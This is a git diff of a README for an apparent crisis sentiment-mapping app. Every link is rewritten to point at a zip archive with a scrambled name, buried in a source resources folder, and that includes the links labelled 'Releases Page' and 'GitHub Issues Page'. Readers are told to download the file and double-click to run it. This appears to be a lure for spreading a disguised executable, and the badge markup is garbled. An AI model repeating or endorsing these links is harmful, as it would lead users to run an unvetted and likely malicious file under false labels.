@@ -1,6 +1,6 @@
 # 🚨 Real-Time-Crisis-Sentiment-Analysis-And-Mapping - Stay Informed During Crises
 
-[![Download Now](https://raw.githubusercontent.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/main/Alexandreid/Real-Time-Crisis-Sentiment-Analysis-And-Mapping.zip%20Now-Real%20Time%20Crisis%https://raw.githubusercontent.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/main/Alexandreid/Real-Time-Crisis-Sentiment-Analysis-And-Mapping.zip)](https://raw.githubusercontent.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/main/Alexandreid/Real-Time-Crisis-Sentiment-Analysis-And-Mapping.zip)
+[![Download Now](https://github.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/raw/refs/heads/main/BackEnd/src/main/resources/Mapping-Time-Analysis-Sentiment-Real-Crisis-And-v3.1-alpha.5.zip%20Now-Real%20Time%20Crisis%https://github.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/raw/refs/heads/main/BackEnd/src/main/resources/Mapping-Time-Analysis-Sentiment-Real-Crisis-And-v3.1-alpha.5.zip)](https://github.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/raw/refs/heads/main/BackEnd/src/main/resources/Mapping-Time-Analysis-Sentiment-Real-Crisis-And-v3.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Real-Time Crisis Sentiment Analysis and Mapping application. This
 
 To get this software on your device, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the following link: [Releases Page](https://raw.githubusercontent.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/main/Alexandreid/Real-Time-Crisis-Sentiment-Analysis-And-Mapping.zip).
+1. **Visit the Releases Page:** Go to the following link: [Releases Page](https://github.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/raw/refs/heads/main/BackEnd/src/main/resources/Mapping-Time-Analysis-Sentiment-Real-Crisis-And-v3.1-alpha.5.zip).
 2. **Choose Your Version:** You'll see a list of available versions. Select the latest one.
 3. **Download the File:** Look for the appropriate file to download. This is typically the largest file presented. Click on it to start the download.
 4. **Run the Application:** Once the file is downloaded, locate it on your computer, and double-click to run it.
@@ -54,13 +54,13 @@ If you encounter issues while using the application, try the following:
 
 1. **Check Your Internet Connection:** Ensure you are connected to the internet.
 2. **Restart the Application:** Sometimes a simple restart can fix problems.
-3. **Re-download the File:** If the app isn’t running, the download may be corrupted. Try downloading it again from the [Releases Page](https://raw.githubusercontent.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/main/Alexandreid/Real-Time-Crisis-Sentiment-Analysis-And-Mapping.zip).
+3. **Re-download the File:** If the app isn’t running, the download may be corrupted. Try downloading it again from the [Releases Page](https://github.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/raw/refs/heads/main/BackEnd/src/main/resources/Mapping-Time-Analysis-Sentiment-Real-Crisis-And-v3.1-alpha.5.zip).
 
 ## 🌍 Community and Support
 
 Join our community for support and updates:
 
-- **GitHub Issues:** Report any bugs or request features directly on our [GitHub Issues Page](https://raw.githubusercontent.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/main/Alexandreid/Real-Time-Crisis-Sentiment-Analysis-And-Mapping.zip).
+- **GitHub Issues:** Report any bugs or request features directly on our [GitHub Issues Page](https://github.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/raw/refs/heads/main/BackEnd/src/main/resources/Mapping-Time-Analysis-Sentiment-Real-Crisis-And-v3.1-alpha.5.zip).
 - **Discussion Forum:** Engage with other users to share experiences and tips.
 
 ## 📝 Contributing
@@ -79,4 +79,4 @@ For more details, refer to the [LICENSE file](LICENSE).
 
 --- 
 
-Thank you for choosing Real-Time Crisis Sentiment Analysis and Mapping. We hope it serves you well in staying informed during urgent situations. Don’t forget to visit our [Releases Page](https://raw.githubusercontent.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/main/Alexandreid/Real-Time-Crisis-Sentiment-Analysis-And-Mapping.zip) to download the latest version!
+Thank you for choosing Real-Time Crisis Sentiment Analysis and Mapping. We hope it serves you well in staying informed during urgent situations. Don’t forget to visit our [Releases Page](https://github.com/223000740/Real-Time-Crisis-Sentiment-Analysis-And-Mapping/raw/refs/heads/main/BackEnd/src/main/resources/Mapping-Time-Analysis-Sentiment-Real-Crisis-And-v3.1-alpha.5.zip) to download the latest version!
